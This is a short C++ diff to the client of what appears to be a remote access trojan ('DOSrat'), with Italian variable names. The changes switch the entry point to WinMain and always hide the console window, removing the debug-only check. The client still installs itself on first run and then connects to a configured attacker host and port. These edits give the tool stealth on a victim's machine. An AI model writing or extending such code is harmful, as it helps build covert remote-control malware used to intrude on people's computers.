@@ -12,7 +12,7 @@ string Version = "2.0.0-b.1";
 
 using namespace std;
 
-int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     TcpIP Client;
     SystemUtils su;
@@ -20,9 +20,12 @@ int main()
     Encode en;
     ConsoleUtils cu;
     Settaggi sett;
-    
-    if (!du.CheckFile(du.GetModuleFilePath() + "DOSratDebug"))
-        cu.HideConsole();
+    EasyMSGB msgb;
+
+    /*if (!du.CheckFile(du.GetModuleFilePath() + "DOSratDebug"))
+        cu.HideConsole();*/
+
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
     {
@@ -34,7 +37,8 @@ int main()
     {
         if (!IsInstalled())
         {
-            InstallClient();
+            short rtn = InstallClient();
+            //msgb.Ok("Codice installazione: " + to_string(rtn));
             return 0;
         }
 
@@ -49,9 +53,6 @@ int main()
 
     Client.Host = sett.Host;
     Client.Port = sett.Porta;
-
-    if (du.CheckDir("VXBkYXRl"))
-        du.DelDir("VXBkYXRl");
 
     if (Client.StartClient() != 0)
     {
